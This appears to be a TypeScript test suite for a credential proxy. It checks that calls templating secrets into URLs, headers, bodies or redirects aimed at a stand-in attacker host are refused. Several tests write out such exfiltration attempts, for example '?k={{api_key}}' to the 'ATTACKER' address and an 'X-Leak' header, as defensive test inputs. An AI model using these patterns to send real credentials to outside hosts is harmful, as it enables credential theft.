// SPDX-License-Identifier: Apache-2.0

/**
 * Credential-exfiltration guard of `proxyCall()` — parity with the sidecar's
 * `executeApiCall` and the local resolver. A call that templates a decrypted
 * credential field (`{{field}}`) into the target, a header or a substituted
 * body does not get `allow_all_uris`: the target and every redirect hop must
 * match `authorized_uris` — plus the origin of any credential field holding an
 * absolute URL (`webhook_url`, `site_url`) — and the call is refused when that
 * list is empty.
 */

import { describe, it, expect, beforeEach } from "bun:test";
import { truncateAll } from "../../helpers/db.ts";
import { createTestContext, type TestContext } from "../../helpers/auth.ts";
import { proxyCall, ProxyAuthorizationError } from "../../../src/services/credential-proxy/core.ts";
import {
  localIntegrationManifest,
  httpHeaderDelivery,
  envDelivery,
} from "../../helpers/integration-manifests.ts";
import {
  seedProxyIntegration,
  seedProxyConnection,
} from "../../helpers/credential-proxy-fixtures.ts";

const PACKAGE_ID = "@cpexfilorg/api";
const SECRET = "sk-live-exfil-7f3a";
const ALLOWED = "https://1.1.1.1";
const ATTACKER = "https://8.8.8.8";

async function seedIntegration(
  ctx: TestContext,
  authorizedUris: string[],
  apiKey = SECRET,
): Promise<void> {
  await seedProxyIntegration(
    ctx,
    localIntegrationManifest({
      name: PACKAGE_ID,
      displayName: "API",
      description: "API integration",
      auths: {
        api: {
          type: "api_key",
          authorizedUris,
          allowAllUris: true,
          delivery: httpHeaderDelivery({
            name: "Authorization",
            prefix: "Bearer ",
            field: "api_key",
          }),
        },
      },
    }),
  );
  await seedProxyConnection(ctx, PACKAGE_ID, "api", { api_key: apiKey });
}

/** `@appstrate/webhooks`-shaped auth: `allow_all_uris`, no allowlist, the endpoint is a field. */
async function seedEndpointIntegration(
  ctx: TestContext,
  fields: Record<string, string>,
): Promise<void> {
  await seedProxyIntegration(
    ctx,
    localIntegrationManifest({
      name: PACKAGE_ID,
      displayName: "Endpoint",
      description: "Endpoint integration",
      auths: {
        api: {
          type: "custom",
          authorizedUris: [],
          allowAllUris: true,
          credentialFields: Object.keys(fields),
          delivery: envDelivery(
            Object.fromEntries(Object.keys(fields).map((f) => [f.toUpperCase(), f])),
          ),
        },
      },
    }),
  );
  await seedProxyConnection(ctx, PACKAGE_ID, "api", fields);
}

/** Upstream recording every URL (and its headers) it is asked for; `respond` defaults to a 200. */
function upstream(respond: (url: string) => Response = () => new Response("{}")) {
  const hits: string[] = [];
  const headers: Headers[] = [];
  const fetchImpl = ((url: string | URL, init?: RequestInit) => {
    hits.push(url.toString());
    headers.push(new Headers(init?.headers));
    return Promise.resolve(respond(url.toString()));
  }) as unknown as typeof fetch;
  return { fetchImpl, hits, headers };
}

describe("proxyCall — credential-exfiltration guard", () => {
  let ctx: TestContext;

  beforeEach(async () => {
    await truncateAll();
    ctx = await createTestContext({ orgSlug: "cpexfilorg" });
  });

  const call = (
    fetchImpl: typeof fetch,
    target: string,
    extra: { headers?: Record<string, string>; body?: string; substituteBody?: boolean } = {},
  ) =>
    proxyCall({
      spaceId: ctx.defaultSpaceId,
      actor: { type: "user", id: ctx.user.id },
      integrationId: PACKAGE_ID,
      method: extra.body ? "POST" : "GET",
      target,
      headers: extra.headers ?? {},
      body: extra.body ?? null,
      substituteBody: extra.substituteBody ?? false,
      fetch: fetchImpl,
    });

  /** Asserts a 403-class refusal whose message never carries the secret; returns the message. */
  async function expectRefused(promise: Promise<unknown>, secret = SECRET): Promise<string> {
    const err = await promise.then(
      () => null,
      (e: unknown) => e,
    );
    expect(err).toBeInstanceOf(ProxyAuthorizationError);
    const { message } = err as Error;
    expect(message).not.toContain(secret);
    return message;
  }

  describe("allow_all_uris + authorized_uris", () => {
    beforeEach(() => seedIntegration(ctx, [`${ALLOWED}/**`]));

    it("refuses a credential templated into an off-allowlist target", async () => {
      const up = upstream();
      await expectRefused(call(up.fetchImpl, `${ATTACKER}/?k={{api_key}}`));
      expect(up.hits).toEqual([]);
    });

    it("refuses a credential templated into a header", async () => {
      const up = upstream();
      await expectRefused(
        call(up.fetchImpl, `${ATTACKER}/collect`, { headers: { "X-Leak": "{{api_key}}" } }),
      );
      expect(up.hits).toEqual([]);
    });

    it("refuses a credential templated into a substituted body", async () => {
      const up = upstream();
      await expectRefused(
        call(up.fetchImpl, `${ATTACKER}/collect`, {
          body: '{"k":"{{api_key}}"}',
          substituteBody: true,
        }),
      );
      expect(up.hits).toEqual([]);
    });

    it("allows a templated call to an allowlisted host", async () => {
      const up = upstream();
      const res = await call(up.fetchImpl, `${ALLOWED}/v1?k={{api_key}}`);
      expect(res.status).toBe(200);
      expect(up.hits).toEqual([`${ALLOWED}/v1?k=${SECRET}`]);
    });

    it("refuses a redirect off the allowlist on a templated call", async () => {
      const up = upstream((url) =>
        url.startsWith(ALLOWED)
          ? new Response(null, {
              status: 302,
              headers: { location: `${ATTACKER}/?k=${SECRET}` },
            })
          : new Response("{}"),
      );
      await expectRefused(call(up.fetchImpl, `${ALLOWED}/r?k={{api_key}}`));
      expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
    });

    it("still reaches any public host without templating", async () => {
      const up = upstream();
      const res = await call(up.fetchImpl, `${ATTACKER}/anything`);
      expect(res.status).toBe(200);
      expect(up.hits).toEqual([`${ATTACKER}/anything`]);
    });
  });

  it("never echoes a normalised secret from a refused redirect's Location", async () => {
    // WHATWG turns `ab|c d` into `ab|c%20d` — neither the raw value nor
    // `encodeURIComponent` matches, so only a host-only message is safe.
    const secret = "ab|c d";
    await seedIntegration(ctx, [`${ALLOWED}/**`], secret);
    const up = upstream((url) =>
      url.startsWith(ALLOWED)
        ? new Response(null, { status: 302, headers: { location: `${ATTACKER}/p?k=${secret}` } })
        : new Response("{}"),
    );
    const message = await expectRefused(call(up.fetchImpl, `${ALLOWED}/r?k={{api_key}}`), secret);
    const location = new URL(`${ATTACKER}/p?k=${secret}`);
    for (const form of [
      encodeURIComponent(secret),
      encodeURI(secret),
      location.search.slice("?k=".length),
      location.searchParams.toString().slice("k=".length),
    ]) {
      expect(message).not.toContain(form);
    }
    expect(message).toContain("8.8.8.8");
    expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
  });

  describe("allow_all_uris, no allowlist, endpoint held in a credential field", () => {
    const WEBHOOK = `${ALLOWED}/hook`;
    const HEADER_SECRET = "whsec-Q7zK";

    beforeEach(() =>
      seedEndpointIntegration(ctx, { webhook_url: WEBHOOK, secret_header_value: HEADER_SECRET }),
    );

    it("reaches the connection's own endpoint with a templated secret header", async () => {
      const up = upstream();
      const res = await call(up.fetchImpl, "{{webhook_url}}", {
        headers: { "X-Secret": "{{secret_header_value}}" },
      });
      expect(res.status).toBe(200);
      expect(up.hits).toEqual([WEBHOOK]);
      expect(up.headers[0]!.get("x-secret")).toBe(HEADER_SECRET);
    });

    it("refuses the endpoint redirecting off its origin", async () => {
      const up = upstream((url) =>
        url.startsWith(ALLOWED)
          ? new Response(null, { status: 302, headers: { location: `${ATTACKER}/x` } })
          : new Response("{}"),
      );
      await expectRefused(
        call(up.fetchImpl, "{{webhook_url}}", {
          headers: { "X-Secret": "{{secret_header_value}}" },
        }),
        HEADER_SECRET,
      );
      expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
    });

    it("refuses a secret templated into another host", async () => {
      const up = upstream();
      await expectRefused(
        call(up.fetchImpl, `${ATTACKER}/?s={{secret_header_value}}`),
        HEADER_SECRET,
      );
      expect(up.hits).toEqual([]);
    });
  });

  it("reaches a base-URL field's origin under a templated path", async () => {
    await seedEndpointIntegration(ctx, { site_url: ALLOWED, application_password: SECRET });
    const up = upstream();
    const res = await call(up.fetchImpl, "{{site_url}}/wp-json/wp/v2/posts");
    expect(res.status).toBe(200);
    expect(up.hits).toEqual([`${ALLOWED}/wp-json/wp/v2/posts`]);
  });

  describe("allow_all_uris without authorized_uris", () => {
    beforeEach(() => seedIntegration(ctx, []));

    it("refuses any templated call", async () => {
      const up = upstream();
      const err = await call(up.fetchImpl, `${ATTACKER}/?k={{api_key}}`).catch((e: unknown) => e);
      expect(err).toBeInstanceOf(ProxyAuthorizationError);
      expect((err as Error).message).toContain("credential exfiltration");
      expect((err as Error).message).not.toContain(SECRET);
      expect(up.hits).toEqual([]);
    });

    it("still reaches any public host without templating", async () => {
      const up = upstream();
      const res = await call(up.fetchImpl, `${ATTACKER}/anything`);
      expect(res.status).toBe(200);
      expect(up.hits).toEqual([`${ATTACKER}/anything`]);
    });
  });
});
